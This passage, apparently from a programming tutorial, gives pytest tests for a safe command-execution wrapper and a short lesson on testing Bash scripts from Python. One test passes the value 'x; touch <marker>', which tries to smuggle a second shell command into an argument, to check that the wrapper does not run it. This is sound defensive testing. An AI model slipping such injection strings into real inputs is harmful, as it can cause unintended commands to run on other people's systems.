    r = se.run([PY, "-c", "print('hello')"])
    assert r.ok and r.stdout == "hello\n"
def test_nonzero_exit_and_stderr():
    r = se.run([PY, "-c", "import sys; sys.stderr.write('bad'); sys.exit(3)"])
    assert r.returncode == 3 and r.stderr == "bad" and not r.ok
def test_check_raises_with_result_attached():
    with pytest.raises(se.CommandError) as ei:
        se.run([PY, "-c", "raise SystemExit(5)"], check=True)
    assert ei.value.result.returncode == 5
def test_timeout_is_reported():
    r = se.run([PY, "-c", "import time; time.sleep(5)"], timeout=0.5)
    assert r.timed_out and r.returncode is None
def test_missing_command():
    r = se.run(["definitely-not-a-real-command-xyz"])
    assert r.returncode == 127 and "not found" in r.stderr
def test_shell_string_rejected():
    with pytest.raises(TypeError):
        se.run("ls -l /tmp")
def test_hostile_argument_is_not_interpreted(tmp_path):
    marker = tmp_path / "pwned"
    evil = f"x; touch {marker}"
    r = se.run([PY, "-c", "import sys; print(sys.argv[1])", evil])
    assert r.stdout.strip() == evil and not marker.exists()
def test_run_json_parses():
    data = se.run_json([PY, "-c", "import json; print(json.dumps({'a': [1, 2]}))"])
    assert data == {"a": [1, 2]}
def test_run_json_bad_output():
    with pytest.raises(se.CommandError, match="invalid JSON"):
        se.run_json([PY, "-c", "print('not json')"])
def test_mocked_subprocess_call_arguments():
    fake = subprocess.CompletedProcess(["ip", "-j", "addr"], 0, "[]", "")
    with mock.patch("subprocess.run", return_value=fake) as m:
        assert se.run_json(["ip", "-j", "addr"]) == []
    args, kwargs = m.call_args
    assert args[0] == ["ip", "-j", "addr"] and kwargs["timeout"] == 30
    assert "shell" not in kwargs
```

Run: python3 -m pytest -q test_safe_exec.py → in the author’s environment (Python 3.13), 10 passed. The module needs Python 3.8+ (for shlex.join).

lessons.title: Calling Bash scripts from Python (and testing them)
lessons.body:
Your Bash scripts are programs with an interface (arguments, exit codes, output). Test them from pytest:

```code
import subprocess, sys
from pathlib import Path
SCRIPT = Path(__file__).parent / "check_files.sh"
def test_check_files_reports_missing(tmp_path):
    present = tmp_path / "ok.txt"; present.write_text("x")
    cp = subprocess.run(["bash", str(SCRIPT), str(present), str(tmp_path / "nope")],
                        capture_output=True, text=True, timeout=10)
    assert cp.returncode == 1
    assert "PASS" in cp.stdout and "FAIL missing" in cp.stdout
```
